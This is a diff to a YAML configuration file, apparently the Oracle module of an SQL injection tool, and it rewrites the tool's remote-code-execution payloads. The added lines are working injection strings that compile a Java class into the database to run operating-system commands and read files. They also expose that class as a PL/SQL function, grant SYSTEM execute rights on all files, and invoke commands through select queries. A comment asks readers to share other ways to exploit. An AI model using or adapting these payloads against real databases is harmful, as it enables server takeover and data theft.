@@ -169,17 +169,55 @@ resource:
     concat: "|| '%7f' ||"
 
  exploit: |
+  # semicolons are blocked during sqli as multiple queries requires a single semicolon
+  # [contribute] share any other ways to exploit on GitHub
   rce:
-   dropSource: ; drop java source "%s";
-   dropFunc: ; drop function %s;
+   dropSource: ; drop java source "%s"
+   dropFunc: ; drop function %s
+  
    addSource: |
-    ; BEGIN%%0aEXECUTE IMMEDIATE 'create or replace and compile java source named "%s" as import java.io.*; public class %s{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = "";while((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}};';%%0aEND;
+    ; begin execute immediate q'[
+      create or replace and compile java source named"%s"as
+        import java.io.*;
+        public class %s {
+          public static String runCmd(String args) {
+            try {
+              BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));
+              String stemp, str = "";
+              while ((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";
+              myReader.close();
+              return str;
+            } catch (Exception e) {
+              return e.toString();
+            }
+          }
+          public static String readFile(String filename) {
+            try {
+              BufferedReader myReader = new BufferedReader(new FileReader(filename));
+              String stemp, str = "";
+              while ((stemp = myReader.readLine()) != null) str %%2B= stemp %%2B "\\n";
+              myReader.close();
+              return str;
+            } catch (Exception e) {
+              return e.toString();
+            }
+          }
+        };
+      ]';end;
+  
    addFunc: |
-    ; BEGIN%%0aEXECUTE IMMEDIATE 'create or replace function %s(p_cmd in varchar2) return varchar2 as language java name ''%s.runCmd(java.lang.String) return String'';';%%0aEND;
+     ; begin execute immediate q'[
+       create or replace function %s(p_cmd in varchar2)
+       return varchar2 as language java name'
+         %s.runCmd(java.lang.String)return String
+       ';
+     ]';end;
+  
    grant: |
-    ; BEGIN%0adbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');%0aEND;
-   confirm: SELECT object_name||'%s' FROM dba_objects WHERE object_name like '%s' and ROWNUM <= 1
-   runCmd: SELECT %s('%s')||'%s' FROM dual
+     ; begin dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');end;
+  
+   confirm: select object_name||'%s' from dba_objects where object_name like '%s' and rownum <= 1
+   runCmd: select %s('%s')||'%s' from dual
 
 strategy:
  configuration:
